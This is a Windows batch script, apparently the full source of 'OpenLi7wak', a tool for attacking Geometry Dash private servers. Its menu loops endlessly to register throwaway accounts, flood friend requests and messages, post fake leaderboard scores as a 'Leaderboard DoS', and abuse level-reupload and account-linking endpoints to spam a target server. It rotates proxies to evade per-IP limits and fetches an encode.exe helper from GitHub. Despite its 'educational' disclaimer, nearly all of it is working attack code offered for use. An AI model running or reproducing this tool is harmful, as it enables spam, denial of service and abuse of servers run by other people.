@echo off
setlocal enabledelayedexpansion
chcp 65001 >NUL
title OpenLi7wak v3 ^|^| Νεκροι χωρις ενημερωση
set state=start
if NOT exist "%localappdata%\OpenLi7wak" (
md "%localappdata%\OpenLi7wak"
) 
if exist "%localappdata%\OpenLi7wak\encode.exe" (
  set FileName="%localappdata%\OpenLi7wak\encode.exe"
) else (
set state=choice
)
:cl
cls
:::    ____                   _      _ ______              _    
:::   / __ \                 | |    (_)____  |            | |   
:::  | |  | |_ __   ___ _ __ | |     _    / /_      ____ _| | __
:::  | |  | | '_ \ / _ \ '_ \| |    | |  / /\ \ /\ / / _` | |/ /
:::  | |__| | |_) |  __/ | | | |____| | / /  \ V  V / (_| |   < 
:::   \____/| .__/ \___|_| |_|______|_|/_/    \_/\_/ \__,_|_|\_\
:::         | |                                                 
:::         |_|     #ripindex
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A             
echo.          
echo THIS TOOL HAS BEEN DISCONTINUED AND SO UNTESTED
echo For EDUCATIONAL purpose! ONLY on your OWN GDPS
echo GDPS Owner may publicly disclose your IP address if the tool is used without EXPLICIT CONSENT
goto %state%                                                                                  
:start
echo --- CHOOSE OPTION ---
echo [1] Reupload SPAM [4Hop]
echo [2] Reupload SPAM [1Hop]
echo [3] Leaderboard DoS
echo [4] Message SPAM
echo --- PROXY OPTIONS ---
echo [5] Add proxy
echo [6] Test proxy
echo [7] Delete proxy settings
echo [8] Open in notepad
echo --- OTHER OPTIONS ---
echo [9] Credits ^& Legal
echo [0] Exit
set /p op=
if %op%==1 set state=rl
if %op%==2 set state=ru
if %op%==3 set state=ls
if %op%==4 set state=ms
if %op%==5 set state=px
if %op%==6 set state=tp
if %op%==7 del %localappdata%\OpenLi7wak\proxy.txt & set "proxied="
if %op%==8 start /W notepad %localappdata%\OpenLi7wak\proxy.txt
if %op%==9 set state=cr
if %op%==0 exit
goto cl
:cr
set state=start
echo.
echo OpenLi7wak was made by Jean for helping people into understanding the vulnerabilities that GDPSes have.
echo OpenLi7wak was inspired of the paid tool: Lunatic Raider, from Paradoxum
echo I condemn the usage of Lunatic Raider for nefarious purposes
echo OpenLi7wak is under the GNU GPL v3 LICENSE
pause
echo.
start http://www.gnu.org/licenses/gpl-3.0.en.html
goto cl
:tp
set state=start
set p=tp1
goto get
:tp1
set test="curl %proxied% -s http://api64.ipify.org/"
for /f "usebackq delims=" %%a in (`!test!`) do (
  echo Your IP is: %%a
)
pause > nul
goto cl
:px
set state=start
echo.
echo You can use a (rotating) proxy with OpenLi7wak because just adding a timeout per ip is a skill issue
echo You can later come back at this option and add another one! Proxies will be picked randomly
echo.
set /p ptp=Proxy type (http://, socks4://, etc... ): 
set /p pra=Proxy address: 
echo Does the proxy require authentication?
set /p pau=[y/n]
if %pau%==N set noauth=1
if %pau%==n set noauth=1
if %noauth%==1 goto nauth
set /p pru=Proxy username: 
set /p prp=Proxy password: 
:nauth
set /p pro=Proxy PORT: 
echo.
echo Are the following values correct?
echo Proxy address: %pra%
if %noauth% neq 1 (
echo Proxy username: %pru%
echo Proxy password: %prp%
)
echo Proxy PORT: %pro%
echo.
echo [y]es / [N]o
set /p conf2=
if %conf2%==y goto pset
if %conf2%==Y goto pset
goto px
:pset
if %noauth%==1 (
echo --proxy "%ptp%%pra%:%pro%" >> %localappdata%\OpenLi7wak\proxy.txt
goto cl
)
echo --proxy "%ptp%%pru%:%prp%@%pra%:%pro%" >> %localappdata%\OpenLi7wak\proxy.txt
goto cl
:ms
set state=start
set /a nb=0 > nul
set /p host=Host (https://gdps.com/database): 
set /p pass=Please give a password to be used: 
for /f "delims=" %%a in ('%FileName% %pass%') do set "password=%%a"
echo Running... Sit tight...
:s
set p=s1
goto get
:s1
set /a nb+=1 > nul
set username=Li7wak %random%%random%
curl %proxied% %host%/tools/account/registerAccount.php -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
set "iatecement=curl %proxied% %host%/accounts/loginGJAccount.php -X POST -d "udid=1^&userName=%username%^&password=%pass%^&secret=Wmfv3899gc9""
set "response="
for /f "usebackq delims=" %%a in (`!iatecement!`) do (
  set "response=%%a"
)
for /f "tokens=1 delims=," %%a in ("%response%") do (
  set "aid=%%a"
)
curl %proxied% -X POST -d "accountID=%aid%&gjp=%password%&toAccountID=%nb%&subject=TGk3d2Fr&comment=TGk3d2Fr&secret=Wmfd2893gb7" %host%/uploadFriendRequest20.php > nul
curl %proxied% -X POST -d "accountID=%aid%&gjp=%password%&toAccountID=%nb%&subject=TGk3d2Fr&body=TGk3d2Fr&secret=Wmfd2893gb7" %host%/uploadGJMessage20.php > nul
echo.
echo Ran
goto :s
goto cl

:ls
set p=ls1
goto get
:ls1
set state=start
set /p host=Host (https://gdps.com/database): 
set /p pass=Please give a password to be used: 
for /f "delims=" %%a in ('%FileName% %pass%') do set "password=%%a"
echo Running... Sit tight...
:q
set username=Li7wak %random%%random%
curl %proxied% %host%/tools/account/registerAccount.php -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
set "iatecement=curl %proxied% %host%/accounts/loginGJAccount.php -X POST -d "udid=1^&userName=%username%^&password=%pass%^&secret=Wmfv3899gc9""
set "response="
for /f "usebackq delims=" %%a in (`!iatecement!`) do (
  set "response=%%a"
)
for /f "tokens=1 delims=," %%a in ("%response%") do (
  set "aid=%%a"
)
curl %proxied% -X POST -d "accountID=%aid%&gjp=%password%&userName=%username%&stars=99999&demons=99999&diamonds=99999&icon=107&color1=29&color2=6&iconType=0&coins=150&userCoins=6969&secret=Wmfd2893gb7" %host%/updateGJUserScore22.php > nul
echo.
echo Ran
goto :q
goto cl
:ru
echo Using [1Hop Exploit]
echo You will provide the following info: Bug host (https://server.com)
echo and the target GDPS to spam (eg https://anygdps.com/database)
echo.
set /p origin=Enter the bug GDPS url (full path): 
set /p target=Enter the GDPS url: 
echo Are the following information correct?
echo.
echo Origin: %origin%
echo Target: %target%
echo [y]es / [N]o
set /p conf1=
if %conf1%==y goto a
if %conf1%==Y goto a
set state=ru
goto cl
:a
set p=a1
goto get
:a1
curl %proxied% -X POST -d "levelid=%random%&server=%origin%/level/%random%/%random%&proxy=1&debug=0" %target%/tools/levelReupload.php
goto :a
set state=start
goto cl

:rl
echo Using [4Hop Exploit]
echo Proxies are required in order to pass the exploit
echo You will provide the following info: Bug host (https://server.com)
echo and the target GDPS to spam (eg https://anygdps.com/database)
echo.
set /p origin=Enter the bug GDPS url (full path): 
set /p target=Enter the GDPS url: 
set /p pass=Please give a password to be used: 
set /p noactivate=Does the account need to be activated ? (y/N)
echo Are the following information correct?
echo.
echo Origin: %origin%
echo Target: %target%
echo Password: %pass%
echo NeedToActivate: %nocativate% (if yes, exploit can only be ran once)
echo [y]es / [N]o
set /p confv1=
if %confv1%==y goto aa
if %confv1%==Y goto aa
set state=rl
goto cl
:aa
set p=aa1
goto get
:aa1
set username=Li7wak %random%%random%
echo.
curl %proxied% "%target%/tools/account/registerAccount.php" -X POST -d "username=%username%&password=%pass%&proxy=1&repeatpassword=%pass%&email=a@a.a&repeatemail=a@a.a" > nul
echo Registered an account!
echo.
if %noactivate%==n goto bb
if %noactivate%==N goto bb
echo Your username is %username% and your password is %pass%
echo.
start http://%target%/tools/account/activateAccount.php
pause
:bb
curl %proxied% "%target%/accounts/loginGJAccount.php" -X POST -d "udid=%random%&userName=%username%&password=%pass%&secret=Wmfv3899gc9" > nul
echo Logged in!
echo.
curl %proxied% "%target%/tools/linkAcc.php" -X POST -d "userhere=%username%&passhere=%pass%&usertarg=%username%&passtarg=%pass%&server=%origin%&server_path=/login/%rand%&debug=0" > nul
echo Linked a fake account!
echo.
set rand=%random%%random%
curl %proxied% "%target%/tools/levelReupload.php" -X POST -d "levelid=%rand%&server=%origin%&server_path=/level/%rand%/%rand%&debug=0&user=%username%&pass=%pass%" > nul
echo.
echo RAN
goto :aa
set state=start
goto cl

:choice
set state=start
echo.
echo encode.exe not found... You can
echo.
echo [1] Download it
echo [2] Import it
set /p file=
if %file%==1 goto crl
set pwshcmd=powershell -noprofile -command "&{[System.Reflection.Assembly]::LoadWithPartialName('System.windows.forms') | Out-Null;$OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog; $OpenFileDialog.ShowDialog()|out-null; $OpenFileDialog.FileName}"
for /f "delims=" %%I in ('%pwshcmd%') do set "FileName=%%I"
copy "%FileName%" "%localappdata%\OpenLi7wak\encode.exe"
set FileName=%localappdata%\OpenLi7wak\encode.exe
goto cl
:crl
curl https://github.com/masckmaster2007/OpenLi7wak/releases/download/v1/encode.exe --output "%localappdata%\OpenLi7wak\encode.exe" -L
set FileName=%localappdata%\OpenLi7wak\encode.exe
goto cl

:get
if NOT exist "%localappdata%\OpenLi7wak\proxy.txt" (
set "proxied="
goto %p%
)
set "txtFile=%localappdata%\OpenLi7wak\proxy.txt"
set "proxied="
for /f %%C in ('type "%txtFile%" ^| find /c /v ""') do set "lineCount=%%C"
set /a "randomLine=(%random% %% %lineCount%) + 1"
for /f "tokens=1* delims=:" %%L in ('findstr /n "^" "%txtFile%" ^| findstr "^%randomLine%:"') do set "proxied=%%M"
goto %p%
endlocal
pause>nul
